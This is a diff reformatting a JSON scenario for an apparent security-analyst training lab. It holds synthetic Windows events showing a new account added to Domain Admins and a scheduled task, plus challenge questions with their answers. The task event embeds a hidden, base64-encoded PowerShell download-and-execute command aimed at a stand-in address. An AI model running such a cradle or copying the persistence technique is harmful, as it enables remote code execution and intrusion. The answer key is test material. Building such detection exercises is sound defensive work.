@@ -6,9 +6,21 @@
   "category": "Persistence",
   "level": "N2",
   "expected_severity": "critical",
-  "expected_rules": ["LAB-007", "LAB-008", "LAB-011"],
-  "mitre": ["T1136.001", "T1098", "T1053.005", "T1078"],
-  "hosts": ["dc-01", "app-01"],
+  "expected_rules": [
+    "LAB-007",
+    "LAB-008",
+    "LAB-011"
+  ],
+  "mitre": [
+    "T1136.001",
+    "T1098",
+    "T1053.005",
+    "T1078"
+  ],
+  "hosts": [
+    "dc-01",
+    "app-01"
+  ],
   "learning_objectives": [
     "Follow an account lifecycle across 4720 and 4728 events.",
     "Recognise persistence through scheduled tasks and decode the payload.",
@@ -21,72 +33,190 @@
     "Is there an approved change that explains any of these actions?"
   ],
   "variables": {
-    "new_account": ["svc_update", "svc-sync", "helpdesk_adm", "sqlbackup"],
-    "task": ["\\Microsoft\\Windows\\Update\\UpdateCheck", "\\Microsoft\\Windows\\Maintenance\\SysHealth"]
+    "new_account": [
+      "svc_update",
+      "svc-sync",
+      "helpdesk_adm",
+      "sqlbackup"
+    ],
+    "task": [
+      "\\Microsoft\\Windows\\Update\\UpdateCheck",
+      "\\Microsoft\\Windows\\Maintenance\\SysHealth"
+    ]
   },
   "steps": [
     {
       "format": "windows_json",
       "offset_seconds": 0,
-      "random_int": {"port": [49152, 65535]},
+      "random_int": {
+        "port": [
+          49152,
+          65535
+        ]
+      },
       "record": {
-        "EventID": 4624, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"TargetUserName": "adm.roliveira", "TargetDomainName": "CORP", "LogonType": "3",
-                      "IpAddress": "10.10.10.24", "IpPort": "{port}", "WorkstationName": "WS-IT-04",
-                      "AuthenticationPackageName": "Kerberos"}
+        "EventID": 4624,
+        "TimeCreated": "{ts}",
+        "Computer": "DC-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "TargetUserName": "adm.roliveira",
+          "TargetDomainName": "CORP",
+          "LogonType": "3",
+          "IpAddress": "10.10.10.24",
+          "IpPort": "{port}",
+          "WorkstationName": "WS-IT-04",
+          "AuthenticationPackageName": "Kerberos"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 1,
       "record": {
-        "EventID": 4672, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
-                      "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"}
+        "EventID": 4672,
+        "TimeCreated": "{ts}",
+        "Computer": "DC-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "adm.roliveira",
+          "SubjectDomainName": "CORP",
+          "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 95,
       "record": {
-        "EventID": 4720, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
-                      "TargetUserName": "{new_account}", "TargetDomainName": "CORP", "SamAccountName": "{new_account}"}
+        "EventID": 4720,
+        "TimeCreated": "{ts}",
+        "Computer": "DC-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "adm.roliveira",
+          "SubjectDomainName": "CORP",
+          "TargetUserName": "{new_account}",
+          "TargetDomainName": "CORP",
+          "SamAccountName": "{new_account}"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 110,
       "record": {
-        "EventID": 4722, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
-                      "TargetUserName": "{new_account}", "TargetDomainName": "CORP"}
+        "EventID": 4722,
+        "TimeCreated": "{ts}",
+        "Computer": "DC-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "adm.roliveira",
+          "SubjectDomainName": "CORP",
+          "TargetUserName": "{new_account}",
+          "TargetDomainName": "CORP"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 160,
       "record": {
-        "EventID": 4728, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
-                      "TargetUserName": "Domain Admins", "TargetDomainName": "CORP",
-                      "MemberName": "CN={new_account},CN=Users,DC=corp,DC=lab"}
+        "EventID": 4728,
+        "TimeCreated": "{ts}",
+        "Computer": "DC-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "adm.roliveira",
+          "SubjectDomainName": "CORP",
+          "TargetUserName": "Domain Admins",
+          "TargetDomainName": "CORP",
+          "MemberName": "CN={new_account},CN=Users,DC=corp,DC=lab"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 420,
       "record": {
-        "EventID": 4698, "TimeCreated": "{ts}", "Computer": "APP-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "{new_account}", "SubjectDomainName": "CORP", "TaskName": "{task}",
-                      "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Triggers><BootTrigger/></Triggers><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=</Arguments></Exec></Actions></Task>"}
+        "EventID": 4698,
+        "TimeCreated": "{ts}",
+        "Computer": "APP-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "{new_account}",
+          "SubjectDomainName": "CORP",
+          "TaskName": "{task}",
+          "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Triggers><BootTrigger/></Triggers><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=</Arguments></Exec></Actions></Task>"
+        }
       }
+    }
+  ],
+  "challenge": [
+    {
+      "id": "new_account",
+      "question": "What is the name of the account that was created?",
+      "kind": "text",
+      "answers": [
+        "{new_account}"
+      ],
+      "hint": "Event 4720 records the new account in TargetUserName.",
+      "explanation": "{new_account} was created on dc-01, a name chosen to blend in with service accounts."
+    },
+    {
+      "id": "actor",
+      "question": "Which account performed the account creation and group change?",
+      "kind": "text",
+      "answers": [
+        "adm.roliveira",
+        "corp\\adm.roliveira"
+      ],
+      "hint": "The SubjectUserName of events 4720 and 4728.",
+      "explanation": "Both changes were made with adm.roliveira, whose credentials the attacker holds."
+    },
+    {
+      "id": "group",
+      "question": "Which privileged group was the new account added to?",
+      "kind": "choice",
+      "answers": [
+        "Domain Admins"
+      ],
+      "hint": "Event 4728: the group name is in TargetUserName.",
+      "explanation": "Domain Admins: full control of the domain. LAB-008 escalates to critical because the account was minutes old.",
+      "options": [
+        "Administrators",
+        "Domain Admins",
+        "Backup Operators",
+        "Remote Desktop Users"
+      ]
+    },
+    {
+      "id": "task_binary",
+      "question": "Which program does the malicious scheduled task execute?",
+      "kind": "choice",
+      "answers": [
+        "powershell.exe"
+      ],
+      "hint": "Open the LAB-011 alert on app-01 and read the task action.",
+      "explanation": "powershell.exe -nop -w hidden -enc ... at boot: an encoded download cradle for persistence.",
+      "options": [
+        "cmd.exe",
+        "powershell.exe",
+        "rundll32.exe",
+        "mshta.exe"
+      ]
     }
   ]
 }
